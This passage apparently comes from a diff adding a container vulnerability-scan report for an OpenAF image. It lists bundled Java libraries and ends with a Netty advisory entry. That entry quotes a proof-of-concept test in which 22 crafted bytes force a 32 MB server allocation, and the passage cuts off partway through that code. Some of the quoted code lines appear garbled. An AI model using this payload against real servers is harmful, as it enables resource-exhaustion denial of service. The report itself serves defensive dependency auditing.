+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [89]  ╭ Name      : org.apache.commons:commons-csv 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-csv@1.14.1 
+      │                 │       │            ╰ UID : 250a69832ed56f8d 
+      │                 │       ├ Version   : 1.14.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [90]  ╭ Name      : org.apache.commons:commons-email 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-email@1.6.0 
+      │                 │       │            ╰ UID : 973048c510561123 
+      │                 │       ├ Version   : 1.6.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [91]  ╭ Name      : org.apache.commons:commons-lang3 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-lang3@3.20.0 
+      │                 │       │            ╰ UID : 85a4dd2e7bf06fed 
+      │                 │       ├ Version   : 3.20.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [92]  ╭ Name      : org.apache.commons:commons-math3 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-math3@3.6.1 
+      │                 │       │            ╰ UID : ce9b8a6c7e85850 
+      │                 │       ├ Version   : 3.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [93]  ╭ Name      : org.bouncycastle:bcprov-jdk18on 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.bouncycastle/bcprov-jdk18on@1.84 
+      │                 │       │            ╰ UID : aa9cc21dd2336977 
+      │                 │       ├ Version   : 1.84 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/bcprov-jdk18on-1.84.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [94]  ╭ Name      : org.eclipse.jetty.compression:jetty-compression-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.compression/jetty-compression-
+      │                 │       │            │       common@12.1.8 
+      │                 │       │            ╰ UID : 33039562bfd52098 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [95]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-client 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core
+      │                 │       │            │       -client@12.1.8 
+      │                 │       │            ╰ UID : c1075786cc5bdd2e 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [96]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core
+      │                 │       │            │       -common@12.1.8 
+      │                 │       │            ╰ UID : 94de3a6f5d13c6e9 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [97]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
+      │                 │       │            │       y-api@12.1.8 
+      │                 │       │            ╰ UID : 73e595faf9ba86ec 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [98]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-client 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
+      │                 │       │            │       y-client@12.1.8 
+      │                 │       │            ╰ UID : db6397111aa534a 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [99]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
+      │                 │       │            │       y-common@12.1.8 
+      │                 │       │            ╰ UID : 5cca9370ca6cc71e 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [100] ╭ Name      : org.eclipse.jetty:jetty-client 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-client@12.1.8 
+      │                 │       │            ╰ UID : 1f5c76d2f9443ff9 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [101] ╭ Name      : org.eclipse.jetty:jetty-http 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-http@12.1.8 
+      │                 │       │            ╰ UID : 1a238b29c95bf018 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [102] ╭ Name      : org.eclipse.jetty:jetty-io 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-io@12.1.8 
+      │                 │       │            ╰ UID : 30f6598d7163432d 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [103] ╭ Name      : org.eclipse.jetty:jetty-util 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.8 
+      │                 │       │            ╰ UID : e793b260df8ee45b 
+      │                 │       ├ Version   : 12.1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [104] ╭ Name      : org.fusesource.hawtjni:hawtjni-runtime 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.hawtjni/hawtjni-runtime@1.17 
+      │                 │       │            ╰ UID : cf88955c9d0ae18b 
+      │                 │       ├ Version   : 1.17 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [105] ╭ Name      : org.fusesource.jansi:jansi 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi@1.18 
+      │                 │       │            ╰ UID : 8ad8d3ab8ae11065 
+      │                 │       ├ Version   : 1.18 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [106] ╭ Name      : org.fusesource.jansi:jansi-freebsd32 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd32@1.8 
+      │                 │       │            ╰ UID : 87b73bc3f694180c 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [107] ╭ Name      : org.fusesource.jansi:jansi-freebsd64 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd64@1.8 
+      │                 │       │            ╰ UID : 68d99c3788225531 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [108] ╭ Name      : org.fusesource.jansi:jansi-linux32 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux32@1.8 
+      │                 │       │            ╰ UID : b748a87749ace306 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [109] ╭ Name      : org.fusesource.jansi:jansi-linux64 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux64@1.8 
+      │                 │       │            ╰ UID : 26eee13eafbc9417 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [110] ╭ Name      : org.fusesource.jansi:jansi-native 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-native@1.8 
+      │                 │       │            ╰ UID : 6fdce73a584d6707 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [111] ╭ Name      : org.fusesource.jansi:jansi-osx 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-osx@1.8 
+      │                 │       │            ╰ UID : 907023130116e83c 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [112] ╭ Name      : org.fusesource.jansi:jansi-windows32 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows32@1.8 
+      │                 │       │            ╰ UID : ab926f311d1d4210 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [113] ╭ Name      : org.fusesource.jansi:jansi-windows64 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows64@1.8 
+      │                 │       │            ╰ UID : edf1cd987a2068b8 
+      │                 │       ├ Version   : 1.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [114] ╭ Name      : org.jctools:jctools-core 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jctools/jctools-core@4.0.5 
+      │                 │       │            ╰ UID : 58fe95ed59ed9509 
+      │                 │       ├ Version   : 4.0.5 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [115] ╭ Name      : org.jetbrains:annotations 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jetbrains/annotations@13.0 
+      │                 │       │            ╰ UID : c0161a29fedca08e 
+      │                 │       ├ Version   : 13.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/annotations-13.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [116] ╭ Name      : org.jspecify:jspecify 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.jspecify/jspecify@1.0.0 
+      │                 │       │            ╰ UID : ed86e540bb7b216a 
+      │                 │       ├ Version   : 1.0.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/jspecify-1.0.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [117] ╭ Name      : org.semver4j:semver4j 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.semver4j/semver4j@6.0.0 
+      │                 │       │            ╰ UID : 452bf269462d8b69 
+      │                 │       ├ Version   : 6.0.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [118] ╭ Name      : org.slf4j:slf4j-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-api@2.0.17 
+      │                 │       │            ╰ UID : e6e431b8b5e0302a 
+      │                 │       ├ Version   : 2.0.17 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [119] ╭ Name      : org.slf4j:slf4j-nop 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-nop@2.0.17 
+      │                 │       │            ╰ UID : 67713c09148cf9b 
+      │                 │       ├ Version   : 2.0.17 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [120] ╭ Name      : org.snakeyaml:snakeyaml-engine 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snakeyaml/snakeyaml-engine@3.0.1 
+      │                 │       │            ╰ UID : 37957af2faa98731 
+      │                 │       ├ Version   : 3.0.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/snakeyaml-engine-3.0.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [121] ╭ Name      : org.snmp4j:snmp4j 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j@3.9.7 
+      │                 │       │            ╰ UID : 2bdda8a0d94fe3fd 
+      │                 │       ├ Version   : 3.9.7 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [122] ╭ Name      : org.snmp4j:snmp4j-agent 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j-agent@3.8.3 
+      │                 │       │            ╰ UID : 7d83d9c8b188faec 
+      │                 │       ├ Version   : 3.8.3 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [123] ╭ Name      : org.xerial.snappy:snappy-java 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.xerial.snappy/snappy-java@1.1.10.8 
+      │                 │       │            ╰ UID : af735d5e5d938188 
+      │                 │       ├ Version   : 1.1.10.8 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/snappy-java-1.1.10.8.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ╰ [124] ╭ Name      : org.yaml:snakeyaml 
+      │                         ├ Identifier ╭ PURL: pkg:maven/org.yaml/snakeyaml@2.4 
+      │                         │            ╰ UID : 47990f5b3f8915ac 
+      │                         ├ Version   : 2.4 
+      │                         ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                         │            │         3113b8395f0ceaa 
+      │                         │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                         │                      f30433b93da5788 
+      │                         ├ FilePath  : openaf/Kube/snakeyaml-2.4.jar 
+      │                         ╰ AnalyzedBy: jar 
+      ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-42583 
+                        │     ├ VendorIDs        ─ [0]: GHSA-mj4r-2hfc-f8p6 
+                        │     ├ PkgName         : io.netty:netty-codec-compression 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
+                        │     │                  ╰ UID : d5a032dd793fa143 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42583 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:b96e03519e2aab5c2df46692ebc1a82295d08c21a4e07ddc304c3f
+                        │     │                   6e1ba31b0c 
+                        │     ├ Title           : Netty Lz4FrameDecoder is vulnerable to resource exhaustion  
+                        │     ├ Description     : ### Summary
+                        │     │                   Lz4FrameDecoder allocates a ByteBuf of size
+                        │     │                   `decompressedLength` (up to 32 MB per block) before LZ4 runs.
+                        │     │                    A peer only needs a 21-byte header plus `compressedLength`
+                        │     │                   payload bytes - 22 bytes if `compressedLength == 1` - to
+                        │     │                   force that allocation.
+                        │     │                   
+                        │     │                   ### Details
+                        │     │                   io.netty.handler.codec.compression.Lz4FrameDecoder#decode
+                        │     │                   Header fields are trusted for sizing. On the compressed path,
+                        │     │                    after `readableBytes >= compressedLength`, the decoder does
+                        │     │                   `ctx.alloc().buffer(decompressedLength, decompressedLength)`
+                        │     │                   then decompresses.
+                        │     │                   ### PoC
+                        │     │                   The test below demonstrates how an attacker sending 22 bytes
+                        │     │                   will force the server to allocate 32MB
+                        │     │                   ```java
+                        │     │                       @Test
+                        │     │                       void test() throws Exception {
+                        │     │                           EventLoopGroup workerGroup = new
+                        │     │                   MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
+                        │     │                           try {
+                        │     │                               AtomicReference<Throwable> serverError = new
+                        │     │                   AtomicReference<>();
+                        │     │                               CountDownLatch latch = new CountDownLatch(1);
+                        │     │                               ServerBootstrap server = new ServerBootstrap()
+                        │     │                                       .group(workerGroup)
+                        │     │                                       .channel(NioServerSocketChannel.class)
+                        │     │                                       .childHandler(new
+                        │     │                   ChannelInitializer<SocketChannel>() {
+                        │     │                                           @Override
+                        │     │                                           protected void
+                        │     │                   initChannel(SocketChannel ch) {
+                        │     │                                               ch.pipeline()
+                        │     │                                                       .addLast(new
+                        │     │                   Lz4FrameDecoder())
+                        │     │                   ChannelInboundHandlerAdapter() {
+                        │     │                                                           @Override
+                        │     │                                                           public void
+                        │     │                   exceptionCaught(ChannelHandlerContext ctx, Throwable cause)
+                        │     │                   {
+                        │     │                                                               if (cause
+                        │     │                   instanceof DecoderException) {
+                        │     │                                                                  
+                        │     │                   serverError.set(cause.getCause());
+                        │     │                                                               } else {
+                        │     │                   serverError.set(cause);
+                        │     │                                                               }
+                        │     │                                                              
+                        │     │                   latch.countDown();
+                        │     │                                                           }
+                        │     │                                                       });
+                        │     │                                           }
+                        │     │                                       });
+                        │     │                               ChannelFuture serverChannel =
+                        │     │                   server.bind(0).sync();
+                        │     │                               Bootstrap client = new Bootstrap()
+                        │     │                                       .channel(NioSocketChannel.class)
+                        │     │                                       .handler(new
+                        │     │                                           public void
+                        │     │                   channelActive(ChannelHandlerContext ctx) {
+                        │     │                                               ByteBuf buf =
+                        │     │                   ctx.alloc().buffer(22, 22);
+                        │     │                                               buf.writeLong(MAGIC_NUMBER);
+                        │     │                                              
